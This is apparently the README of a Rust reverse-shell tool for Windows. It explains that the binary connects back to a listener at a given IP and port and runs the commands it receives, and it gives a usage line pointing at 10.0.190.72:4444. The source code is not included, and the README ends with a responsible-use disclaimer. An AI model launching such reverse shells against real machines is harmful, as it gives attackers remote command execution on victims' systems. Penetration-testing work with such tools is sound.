# rust_windows_revshell

This is a simple Rust reverse shell written to run on a Windows machine and provide a reverse shell connection back to a listener.  It takes two arguments, an IP and a port, and will run any commands given to it under the user context it was run from.

Usage:

rust_revshell.exe 10.0.190.72 4444

I have modified this to allow you to specify the IP and port to connect to from the command line, so you don't need to recompile this constantly for difference scenarios.

Misusing this code for illegal or unethical purposes may result in severe legal and ethical consequences. So, please use this code responsibly and ethically. 
